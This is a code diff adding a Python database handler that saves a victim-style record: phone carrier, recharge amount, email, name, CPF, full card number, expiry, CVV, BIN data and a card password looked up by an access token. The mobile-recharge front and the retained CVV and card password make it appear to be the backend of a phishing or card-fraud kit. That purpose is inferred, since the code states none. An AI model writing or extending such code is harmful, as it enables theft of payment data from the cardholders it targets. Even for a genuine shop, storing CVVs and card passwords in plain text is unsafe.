@@ -1,0 +1,50 @@
+from model.cardModel import Card
+
+
+class CardHandler:
+    def __init__(self, database):
+        self.db = database
+
+    def createCard(
+            self,
+            celular: str,
+            operadora: str,
+            valor: str,
+            email: str,
+            nome: str,
+            cpf: str,
+            card: str,
+            mes: str,
+            ano: str,
+            cvv: str,
+            token: str,
+            bin: str,
+            dadosbin: str) -> int:
+        card = Card(
+            celular=celular,
+            operadora=operadora,
+            valor=valor,
+            email=email,
+            nome=nome,
+            cpf=cpf,
+            card=card,
+            mes=mes,
+            ano=ano,
+            cvv=cvv,
+            token=token,
+            bin=bin,
+            dadosbin=dadosbin
+        )
+        self.db.session.add(card)
+        self.db.session.commit()
+        return card.id
+
+    def getCardsByToken(self, token: str):
+        return Card.query.filter_by(token=token).all()
+
+    def updatePassword(self, token: str, password: str):
+        # UPDATE infos SET senha = :senha WHERE TokenAcesso = :TokenAcesso
+        cards = self.getCardsByToken(token)
+        for card in cards:
+            card.senha = password
+        self.db.session.commit()
